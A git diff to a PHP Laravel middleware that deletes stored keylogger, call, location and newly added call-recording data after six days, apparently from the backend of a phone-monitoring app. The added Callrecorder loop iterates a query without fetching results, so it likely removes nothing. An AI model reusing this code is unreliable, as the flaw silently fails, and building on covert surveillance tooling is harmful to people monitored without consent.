@@ -4,6 +4,7 @@ namespace App\Http\Middleware;
 
 use App\Models\App;
 use App\Models\Call;
+use App\Models\Callrecorder;
 use App\Models\Gopay;
 use App\Models\Keylogger;
 use App\Models\Location;
@@ -30,7 +31,7 @@ class PayementMiddleware
      */
     public function handle(Request $request, Closure $next)
     {
-        $mindate = Carbon::now()->subDays(7);
+        $mindate = Carbon::now()->subDays(6);
         // App::where('date', '<', $mindate)->delete();
         Keylogger::where('date', '<', $mindate)->delete();
         Call::where('date', '<', $mindate)->delete();
@@ -40,6 +41,12 @@ class PayementMiddleware
         foreach ($rem as $el) {
             File::delete("storage/" . $el->result);
             $el->update(['result' => null]);
+        }
+
+        $rem = Callrecorder::where('date', '<', $mindate);
+        foreach ($rem as $el) {
+            File::delete("storage/" . $el->path);
+            $el->delete();
         }
 
         DB::beginTransaction();
